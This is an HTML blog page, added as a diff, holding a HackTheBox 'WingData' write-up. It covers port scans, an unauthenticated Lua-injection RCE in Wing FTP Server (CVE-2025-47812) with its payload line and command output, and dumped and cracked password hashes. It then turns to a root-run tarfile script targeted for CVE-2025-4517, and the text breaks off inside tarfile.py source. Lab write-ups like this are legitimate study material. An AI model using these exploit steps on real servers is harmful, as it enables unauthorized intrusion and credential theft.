@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="google-site-verification" content="dV6KjIkknGohXAcbxJ9_KJCboixCD27CCJrwdBZjht0" />
+
+<title>HTB: WingData | IntelliJr</title>
+
+
+
+
+
+
+<link crossorigin="anonymous" href="/assets/css/stylesheet.debd4a8f95b7c847f48426eb9925cc6a9352d8314d4ebfe1ea4c987efaa9d31a.css" integrity="sha256-3r1Kj5W3yEf0hCbrmSXMapNS2DFNTr/h6kyYfvqp0xo=" rel="preload stylesheet" as="style">
+
+
+<link rel="icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="http://localhost:1313/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/wingdata/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+
+    <link rel="stylesheet" href="http://localhost:1313/assets/css/stylesheet.css">
+</head>
+
+<body>
+    
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" title="">
+                <img src="http://localhost:1313/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">IntelliJr</a>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups" title="">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <div class="logo-switches">
+            </div>
+        </ul>
+    </nav>
+</header>
+
+    <hr/>
+    <main class="main">
+        
+
+
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">
+      HTB: WingData
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-28 00:00:00 +0000 UTC'>June 28, 2026</span></div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/img/wingdata/wingdata-avatar.png" alt="">
+        
+</figure>
+  <div class="post-content">
+    <h1 id="synopsis">Synopsis</h1>
+<p>A simple Linux machine with SSH and HTTP ports open. The web server is running Wing FTP Server v7.4.3 vulnerable to unauthenticated RCE due to improper user input handling on the login page (CVE-2025-47812), giving us the first user. The Wing FTP Server files contain a hash of another user that can be cracked, giving us SSH access as the next user. Finally, we find a custom Python script that uses a vulnerable standard library function that allows us to perform arbitrary file write (CVE-2025-4517) and take full control of the machine.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>Quick open port scan:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap 10.129.244.106 -Pn -p- --min-rate <span class="m">5000</span> -oA scans/scan1
+</span></span></code></pre></div><pre tabindex="0"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><p> <br>
+Targeted port scan:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap 10.129.244.106 -Pn -p22,80 -sCV -oA scans/scan2
+</span></span></code></pre></div><pre tabindex="0"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Did not follow redirect to http://wingdata.htb/
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p> <br>
+Let&rsquo;s add the <code>wingdata.htb</code> domain to the <code>/etc/hosts</code> file and check out the website.</p>
+<p><img loading="lazy" src="/img/wingdata/1.png"></p>
+<p>The Client Portal button on the website leads to <a href="http://ftp.wingdata.htb/">http://ftp.wingdata.htb/</a>.
+<img loading="lazy" src="/img/wingdata/2.png">
+The FTP server uses Wing FTP Server v7.4.3.</p>
+<h1 id="user">User</h1>
+<p>With the help of Google we can find CVE-2025-47812 - Wing FTP Server &lt; v7.4.4 allows RCE via Lua Injection due to improper handling of null bytes in login input. This vulnerability works unauthenticated if anonymous login is enabled. An example PoC can be found at <a href="https://github.com/r0otk3r/CVE-2025-47812">https://github.com/r0otk3r/CVE-2025-47812</a>.</p>
+<p>Before exploiting the vulnerability, let&rsquo;s see if anonymous login works by supplying <code>anonymous</code> in the username field. And it does! We land on the <code>/main.html</code> URL. This means that the CVE will work unauthenticated.
+<img loading="lazy" src="/img/wingdata/3.png">
+Also, upon trying to perform any actions by clicking Upload File or More Actions, we get a pop-up message saying we do not have permissions to perform the action, so there seems to be nothing we can abuse without abusing the CVE.</p>
+<p>Let&rsquo;s run the exploit.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 ~/Downloads/wingftp_cve_2025_47812.py -u <span class="s2">&#34;http://ftp.wingdata.htb/&#34;</span> -c <span class="s2">&#34;id&#34;</span> -U anonymous -P password -v -i
+</span></span></code></pre></div><pre tabindex="0"><code>[*] Target: http://ftp.wingdata.htb/
+[*] Running command: id
+
+[+] Sending payload to http://ftp.wingdata.htb/
+[+] Payload: username=anonymous%00]]%0dlocal+h+%3d+io.popen(&#34;id&#34;)%0dlocal+r+%3d+h%3aread(&#34;*a&#34;...
+[+] Exploit successful!
+
+--- Command Output ---
+uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
+----------------------
+
+[*] Launching interactive shell (type &#39;exit&#39; to quit)
+
+cmd-inject&gt;
+</code></pre><p> <br>
+This exploit gives an interactive shell as a <code>wingftp</code> user, and it also turns out we&rsquo;re a member of quite many different groups! However, this shell is a bit unstable to use, and running various commands to get our own reverse shell fails too. Luckily, there is also an exploit for this CVE available on msfconsole, <code>multi/http/wingftp_null_byte_rce</code>), which will provide us with a more convenient and stable Meterpreter shell.</p>
+<p>Inside the <code>/opt/wftpserver/</code> directory we can find files related to the Wing FTP server. There are two databases, <code>/opt/wftpserver/Data/bookmark_db</code> and <code>/opt/wftpserver/Log/audit_db</code>, which, unfortunately, do not contain anything useful. Inside <code>/opt/wftpserver/Data/_ADMINISTRATOR/</code> and <code>/opt/wftpserver/Data/1/users/</code>, we can find files containing information on user credentials.</p>
+<p><code>/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;ADMIN_ACCOUNTS</span> <span class="na">Description=</span><span class="s">&#34;Wing FTP Server Admin Accounts&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ADMIN&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Admin_Name&gt;</span>admin<span class="nt">&lt;/Admin_Name&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Password&gt;</span>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba<span class="nt">&lt;/Password&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Type&gt;</span>0<span class="nt">&lt;/Type&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Readonly&gt;</span>0<span class="nt">&lt;/Readonly&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;IsDomainAdmin&gt;</span>0<span class="nt">&lt;/IsDomainAdmin&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;DomainList&gt;&lt;/DomainList&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;MyDirectory&gt;&lt;/MyDirectory&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;EnableTwoFactor&gt;</span>0<span class="nt">&lt;/EnableTwoFactor&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;TwoFactorCode&gt;&lt;/TwoFactorCode&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/ADMIN&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/ADMIN_ACCOUNTS&gt;</span>
+</span></span></code></pre></div><p>This looks like a SHA-256 hash (Hashcat mode 1400), but cracking it with Hashcat doesn&rsquo;t work.</p>
+<p><code>/opt/wftpserver/Data/_ADMINISTRATOR/settings.xml</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;Administrator</span> <span class="na">Description=</span><span class="s">&#34;Wing FTP Server Administrator Options&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;HttpPort&gt;</span>5466<span class="nt">&lt;/HttpPort&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;HttpSecure&gt;</span>0<span class="nt">&lt;/HttpSecure&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;AdminLogfileEnable&gt;</span>1<span class="nt">&lt;/AdminLogfileEnable&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;AdminLogfileFileName&gt;</span>Admin-%Y-%M-%D.log<span class="nt">&lt;/AdminLogfileFileName&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;AdminLogfileMaxsize&gt;</span>0<span class="nt">&lt;/AdminLogfileMaxsize&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;EnablePortUPnP&gt;</span>0<span class="nt">&lt;/EnablePortUPnP&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Administrator&gt;</span>
+</span></span></code></pre></div><ul>
+<li>Internal port 5466 is running an Administrator Options panel.</li>
+</ul>
+<p><code>/opt/wftpserver/Data/1/users/wacky.xml</code> contains the hash of <code>wacky</code> inside the <code>&lt;Password&gt;</code> tag: <code>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</code>. There are other users&rsquo; hashes in that directory too, but the username <code>wacky</code> is the only one present in the <code>/etc/passwd</code> file among them, so we&rsquo;re gonna try to crack this one; and&hellip; it doesn&rsquo;t work either.</p>
+<p>After doing some <a href="https://www.wftpserver.com/help/ftpserver/index.html?compression.htm">research</a>, I found out that the WingFTP hashes can be salted with the <code>WingFTP</code> salt, so we should append <code>:WingFTP</code> to our hash. Now that we know we have a salt, we should use the Hashcat mode 1410 (SHA-256 salted). The <code>wacky</code>&rsquo;s password got cracked successfully now: <code>!#7Blushing^*Bride5</code>.</p>
+<h1 id="root">Root</h1>
+<p>Running <code>sudo -l</code> shows that we can run <code>/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</code> as root.
+There&rsquo;s also a <code>backup_clients</code> directory in <code>/opt</code>, only readable by root and <code>wacky</code>.</p>
+<p><code>backup_clients</code> contains two empty directories, <code>backups</code> and <code>restored_backups</code>, as well as the <code>restore_backup_clients.py</code> script. Maybe the directories are where the input/output for the script goes.</p>
+<p><code>restore_backup_clients.py</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tarfile</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BACKUP_BASE_DIR</span> <span class="o">=</span> <span class="s2">&#34;/opt/backup_clients/backups&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">STAGING_BASE</span> <span class="o">=</span> <span class="s2">&#34;/opt/backup_clients/restored_backups&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">validate_backup_name</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">fullmatch</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^backup_\d+\.tar$&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client_id</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;.tar&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">client_id</span><span class="o">.</span><span class="n">isdigit</span><span class="p">()</span> <span class="ow">and</span> <span class="n">client_id</span> <span class="o">!=</span> <span class="s2">&#34;0&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">validate_restore_tag</span><span class="p">(</span><span class="n">tag</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bool</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">fullmatch</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^[a-zA-Z0-9_]{1,24}$&#34;</span><span class="p">,</span> <span class="n">tag</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">description</span><span class="o">=</span><span class="s2">&#34;Restore client configuration from a validated backup tarball.&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">epilog</span><span class="o">=</span><span class="s2">&#34;Example: sudo </span><span class="si">%(prog)s</span><span class="s2"> -b backup_1001.tar -r restore_john&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-b&#34;</span><span class="p">,</span> <span class="s2">&#34;--backup&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &#34;</span>
+</span></span><span class="line"><span class="cl">             <span class="s2">&#34;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;-r&#34;</span><span class="p">,</span> <span class="s2">&#34;--restore-dir&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Staging directory name for the restore operation. &#34;</span>
+</span></span><span class="line"><span class="cl">             <span class="s2">&#34;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &#34;</span>
+</span></span><span class="line"><span class="cl">             <span class="s2">&#34;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">validate_backup_name</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">backup</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&#34;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">backup_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">BACKUP_BASE_DIR</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">backup</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">backup_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Backup file not found: </span><span class="si">{</span><span class="n">backup_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">restore_dir</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;restore_&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] --restore-dir must start with &#39;restore_&#39;&#34;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">tag</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">restore_dir</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">tag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] --restore-dir must include a non-empty tag after &#39;restore_&#39;&#34;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">validate_restore_tag</span><span class="p">(</span><span class="n">tag</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&#34;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">staging_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">STAGING_BASE</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">restore_dir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Backup: </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">backup</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Staging directory: </span><span class="si">{</span><span class="n">staging_dir</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">staging_dir</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">tarfile</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">backup_path</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">tar</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">tar</span><span class="o">.</span><span class="n">extractall</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">staging_dir</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="s2">&#34;data&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Extraction completed in </span><span class="si">{</span><span class="n">staging_dir</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="n">tarfile</span><span class="o">.</span><span class="n">TarError</span><span class="p">,</span> <span class="ne">OSError</span><span class="p">,</span> <span class="ne">Exception</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[!] Error during extraction: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p> <br>
+The use of the <code>tarfile</code> library might be interesting, it&rsquo;s not something that you see often&hellip; Let&rsquo;s try to find the version of this library.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3
+</span></span></code></pre></div><pre tabindex="0"><code>Python 3.12.3 (main, Nov  3 2025, 09:30:32) [GCC 12.2.0] on linux
+Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
+&gt;&gt;&gt; import tarfile
+&gt;&gt;&gt; tarfile.version
+&#39;0.9.0&#39;
+&gt;&gt;&gt; 
+</code></pre><p> <br>
+Alternatively, we can find it with the help of the <code>find</code> command, by locating the library file itself and reading the version from there.<br>
+<code>/usr/local/lib/python3.12/tarfile.py</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># tarfile.py</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#-------------------------------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Copyright (C) 2002 Lars Gustaebel &lt;lars@gustaebel.de&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># All rights reserved.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Permission  is  hereby granted,  free  of charge,  to  any person</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># obtaining a  copy of  this software  and associated documentation</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># files  (the  &#34;Software&#34;),  to   deal  in  the  Software   without</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># restriction,  including  without limitation  the  rights to  use,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># copy, modify, merge, publish, distribute, sublicense, and/or sell</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># copies  of  the  Software,  and to  permit  persons  to  whom the</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Software  is  furnished  to  do  so,  subject  to  the  following</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># conditions:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The above copyright  notice and this  permission notice shall  be</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># included in all copies or substantial portions of the Software.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># THE SOFTWARE IS PROVIDED &#34;AS  IS&#34;, WITHOUT WARRANTY OF ANY  KIND,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># EXPRESS OR IMPLIED, INCLUDING  BUT NOT LIMITED TO  THE WARRANTIES</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># OF  MERCHANTABILITY,  FITNESS   FOR  A  PARTICULAR   PURPOSE  AND</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># NONINFRINGEMENT.  IN  NO  EVENT SHALL  THE  AUTHORS  OR COPYRIGHT</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># HOLDERS  BE LIABLE  FOR ANY  CLAIM, DAMAGES  OR OTHER  LIABILITY,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># WHETHER  IN AN  ACTION OF  CONTRACT, TORT  OR OTHERWISE,  ARISING</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># OTHER DEALINGS IN THE SOFTWARE.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Read from and write to tar format archives.
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
